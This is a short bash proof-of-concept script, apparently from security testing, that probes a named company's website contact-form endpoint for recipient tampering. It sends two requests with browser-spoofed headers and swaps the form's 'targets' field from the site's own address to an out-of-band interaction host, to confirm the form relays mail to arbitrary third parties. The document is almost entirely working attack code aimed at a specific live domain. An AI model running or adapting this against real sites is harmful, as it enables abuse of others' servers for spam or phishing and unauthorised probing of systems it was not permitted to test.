#!/bin/bash
# Independent verification: A/B comparison of POST /api/send
# Only the "targets" (recipient) field differs between the two requests.
BASE="https://www.infinitycapital.bh"
OOB="verif-relay-9f3c1a@oobf87080b3c840.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

send () {
  local tag="$1"; local tgt="$2"
  echo "=============================================================="
  echo "TEST: $tag"
  echo "targets = [$tgt]"
  curl -sS -D "ab_${tag}.hdr" -o "ab_${tag}.json" -X POST "$BASE/api/send" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" \
    -H "Origin: $BASE" -H "Referer: $BASE/contact" \
    --max-time 45 \
    -F "fname=Verifier" -F "lname=Independent" \
    -F "areacode=+973" -F "tel=3000000" \
    -F "cname=Independent Verification" \
    -F "subject=Automated security verification - please ignore" \
    -F "msg=Non-destructive functional verification of the contact form mail endpoint. Please ignore this message." \
    -F "check=not-a-bot" \
    -F "targets=$tgt"
  echo "--- HTTP status ---"; head -1 "ab_${tag}.hdr"
  echo "--- body ---"; cat "ab_${tag}.json"; echo
}

# A: recipient = the site's own address (what the real form sends)
send "A_official_recipient" "info@infinitycapital.bh"
sleep 2
# B: recipient = arbitrary third party, nothing else changed
send "B_arbitrary_recipient" "$OOB"
